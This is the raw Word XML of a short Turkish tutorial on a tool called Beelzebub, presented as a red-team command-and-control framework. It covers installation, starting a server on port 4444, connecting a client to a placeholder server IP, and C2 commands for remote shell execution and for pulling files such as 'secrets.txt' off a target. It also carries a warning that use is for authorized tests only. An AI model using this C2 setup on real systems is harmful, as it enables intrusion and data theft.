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4411" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="KonuBal"/>
      </w:pPr>
      <w:r>
        <w:t>Beelzebub Aracı Nedir ve Nasıl Kullanılır?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77502660" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>😈 Beelzebub Nedir?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DD27C9" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Beelzebub, bir Red Team Command &amp; Control (C2) framework'üdür. Uzaktan yönetilen istemciler (beacon'lar) üzerinden sistem kontrolü sağlamak, komut çalıştırmak, bilgi toplamak ve veri sızdırmak amacıyla kullanılır. Geliştirici: klezVirus (https://github.com/klezVirus/Beelzebub)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374C2E0D" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>🎯 Özellikleri</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008F6F02" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Gelişmiş C2 mimarisi</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Cross-platform istemci desteği (Linux, Windows, macOS)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- TCP, HTTP/S veya DNS üzerinden iletişim</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- AES-256 şifreli bağlantı</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Komut çalıştırma, dosya transferi, ekran görüntüsü alma</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Python tabanlıdır</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A261BE" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>⚙️ Kurulum (Kali Linux)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6AAB08" w14:textId="77777777" w:rsidR="00CA31D7" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. Python ve bağımlılıkları kur:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt update</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt install python3 python3-pip git -y</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA31D7" w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="275A3B37" wp14:editId="192E946A">
            <wp:extent cx="3962953" cy="1038370"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="194631546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546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8C6A7A" w14:textId="280E57FF" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:r>
        <w:t>2. Beelzebub’u indir:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/klezVirus/Beelzebub.git</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cd Beelzebub</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA31D7" w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="282DD73B" wp14:editId="7661FD53">
            <wp:extent cx="4648849" cy="933580"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="102154822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822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3. Gereken kütüphaneleri yükle:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>pip3 install -r requirements.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA31D7" w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49529B84" wp14:editId="01C626F5">
            <wp:extent cx="3429479" cy="724001"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2061905066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05066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EFD" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>▶️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kullanım</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC37F1A" w14:textId="2A1BFC74" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Server başlatma:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 Beelzebub.py --server --port 4444</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA31D7" w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39C9255F" wp14:editId="7503FE64">
            <wp:extent cx="3962953" cy="704948"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2124110827" name="Resim 1" descr="ekran görüntüsü, yazı tipi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0827" name="Resim 1" descr="ekran görüntüsü, yazı tipi, metin, grafik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İstemci çalıştırma:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 Beelzebub.py --client --host &lt;SERVER_IP&gt; --port 4444</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CA31D7" w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EB0A4EB" wp14:editId="64D14B1E">
            <wp:extent cx="5277587" cy="752580"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="56152137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2137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Komutlar:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `shell whoami` → Hedef sistemde komut çalıştırır</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `screenshot` → Ekran görüntüsü alır</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `upload file.txt` → Hedefe dosya gönderir</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- `download secrets.txt` → Hedeften dosya çeker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EFDBFD" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>📟</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Örnek Terminal Çıktısı</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08601AD1" w14:textId="0454DB49" w:rsidR="00CA31D7" w:rsidRPr="00CA31D7" w:rsidRDefault="00CA31D7" w:rsidP="00CA31D7">
      <w:r w:rsidRPr="00CA31D7">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="466D2057" wp14:editId="41384CB0">
            <wp:extent cx="5486400" cy="2143125"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="39372595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595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5E60" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>⚠️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Dikkat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C65DFF" w14:textId="77777777" w:rsidR="00321496" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Bu araç yalnızca izinli ve yasal test ortamlarında kullanılmalıdır.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Gerçek sistemlerde izinsiz kullanımı suç teşkil eder.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00321496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6663288">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="364409748">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1254823174">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1562398064">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1594892887">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2086369935">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1557158308">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1248929361">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="985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71"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00321496"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CA31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D9DDC"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{7B1E0C92-1C91-4F98-9FFB-D5A9322B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2025-07-29T13:18:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>